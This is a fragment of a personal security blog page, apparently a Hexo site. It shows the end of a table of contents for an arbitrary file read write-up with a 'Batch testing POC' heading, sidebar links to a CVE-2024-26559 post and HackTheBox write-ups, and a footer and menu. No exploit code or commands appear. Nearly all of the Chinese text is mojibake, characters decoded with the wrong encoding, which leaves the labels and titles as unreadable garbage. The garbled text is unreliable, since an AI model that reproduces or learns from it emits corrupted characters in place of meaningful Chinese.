   2. [2.2. Read any file in the background](#Read-any-file-in-the-background)
   3. [2.3. Read any file in the foreground](#Read-any-file-in-the-foreground)
   4. [2.4. Batch testing POC:](#Batch-testing-POC)
æœ€è¿‘å‘å¸ƒ[![UéªŒè¯ä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-26559)](data:image/gif;base64...)](/2024/01/22/U%E9%AA%8C%E8%AF%81%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/ "UéªŒè¯ä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-26559)")[UéªŒè¯ä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-26559)](/2024/01/22/U%E9%AA%8C%E8%AF%81%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/ "UéªŒè¯ä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-26559)")2024-01-22[![Clicker_Medium](data:image/gif;base64...)](/2023/11/03/Clicker_Medium/ "Clicker_Medium")[Clicker\_Medium](/2023/11/03/Clicker_Medium/ "Clicker_Medium")2023-11-03[![Giddy_Medium](data:image/gif;base64...)](/2023/10/24/Giddy_Medium/ "Giddy_Medium")[Giddy\_Medium](/2023/10/24/Giddy_Medium/ "Giddy_Medium")2023-10-24[![Busqueda_easy](data:image/gif;base64...)](/2023/10/11/Busqueda_easy/ "Busqueda_easy")[Busqueda\_easy](/2023/10/11/Busqueda_easy/ "Busqueda_easy")2023-10-11[![ã€Šä¹Œåˆä¹‹ä¼—ã€‹](data:image/gif;base64...)](/2023/08/11/%E3%80%8A%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97%E3%80%8B/ "ã€Šä¹Œåˆä¹‹ä¼—ã€‹")[ã€Šä¹Œåˆä¹‹ä¼—ã€‹](/2023/08/11/%E3%80%8A%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97%E3%80%8B/ "ã€Šä¹Œåˆä¹‹ä¼—ã€‹")2023-08-11

[![åšå®¢æ¡†æ¶ä¸ºHexo_v5.4.0](data:image/gif;base64...)](https://hexo.io/ "åšå®¢æ¡†æ¶ä¸ºHexo_v5.4.0")[![æœ¬ç«™ä½¿ç”¨AnZhiYuä¸»é¢˜](data:image/gif;base64...)](https://blog.anheyu.com/ "æœ¬ç«™ä½¿ç”¨AnZhiYuä¸»é¢˜")[![æœ¬ç«™ä½¿ç”¨å¤šå‰äº‘ä¸ºé™æ€èµ„æºæä¾›CDNåŠ é€Ÿ](data:image/gif;base64...)](https://www.dogecloud.com/ "æœ¬ç«™ä½¿ç”¨å¤šå‰äº‘ä¸ºé™æ€èµ„æºæä¾›CDNåŠ é€Ÿ")[![æœ¬ç«™é¡¹ç›®ç”±Githubæ‰˜ç®¡](data:image/gif;base64...)](https://github.com/076w/ "æœ¬ç«™é¡¹ç›®ç”±Githubæ‰˜ç®¡")[![æœ¬ç«™é‡‡ç”¨çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«4.0å›½é™…è®¸å¯åè®®è¿›è¡Œè®¸å¯](data:image/gif;base64...)](http://creativecommons.org/licenses/by-nc-sa/4.0/ "æœ¬ç«™é‡‡ç”¨çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«4.0å›½é™…è®¸å¯åè®®è¿›è¡Œè®¸å¯")

Â©2020 - 2024 By [076w](/ "076w")[ä¸»é¢˜](https://github.com/anzhiyu-c/hexo-theme-anzhiyu "ä¸»é¢˜")[æ–‡ç« 11](/archives/ "archive")[æ ‡ç­¾6](/tags/ "tag")[åˆ†ç±»8](/categories/ "category")åŠŸèƒ½æ˜¾ç¤ºæ¨¡å¼ç½‘é¡µ[![åšå®¢](data:image/gif;base64...)](https://syst1m.cn/ "åšå®¢")[![è¯­é›€](data:image/gif;base64...)](https://www.yuque.com/076w "è¯­é›€")é¡¹ç›®[![Github](data:image/gif;base64...)](https://github.com/076w "Github") æ–‡ç« 

* [éš§é“](/archives/)
* [åˆ†ç±»](/categories/)
* [æ ‡ç­¾](/tags/)
 å‹é“¾

* [å‹äººå¸](/link/)
* [æœ‹å‹åœˆ](/fcircle/)
* [ç•™è¨€æ¿](/comments/)
 æˆ‘çš„

* [éŸ³ä¹é¦†](/music/)
* [è¿½ç•ªé¡µ](/bangumis/)
* [ç›¸å†Œé›†](/album/)
* [å°ç©ºè°ƒ](/air-conditioner/)
 å…³äº

* [å…³äºæœ¬äºº](/about/)
* [é—²è¨€ç¢è¯­](/essay/)
* éšä¾¿é€›é€›
æ ‡ç­¾[HackTheBox3](/tags/HackTheBox/)[Mac1](/tags/Mac/)[python3](/tags/python/)[åŸåˆ›æ¼æ´1](/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/)[å®‰å“æ¨¡æ‹Ÿå™¨1](/tags/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8/)[ç½‘ç»œå®‰å…¨2](/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/)

---

ç¹å¤åˆ¶é€‰ä¸­æ–‡æœ¬ç²˜è´´æ–‡æœ¬å¼•ç”¨åˆ°è¯„è®ºæ–°çª—å£æ‰“å¼€å¤åˆ¶é“¾æ¥åœ°å€å¤åˆ¶æ­¤å›¾ç‰‡ä¸‹è½½æ­¤å›¾ç‰‡æ–°çª—å£æ‰“å¼€å›¾ç‰‡ç«™å†…æœç´¢ç™¾åº¦æœç´¢æ’­æ”¾éŸ³ä¹åˆ‡æ¢åˆ°ä¸Šä¸€é¦–åˆ‡æ¢åˆ°ä¸‹ä¸€é¦–æŸ¥çœ‹æ‰€æœ‰æ­Œæ›²å¤åˆ¶æ­Œåéšä¾¿é€›é€›[åšå®¢åˆ†ç±»](/categories/)[æ–‡ç« æ ‡ç­¾](/tags/)å¤åˆ¶åœ°å€å…³é—­çƒ­è¯„æ·±è‰²æ¨¡å¼è½‰ç‚ºç¹é«”é€šçŸ¥ä½ å¥½å‘€
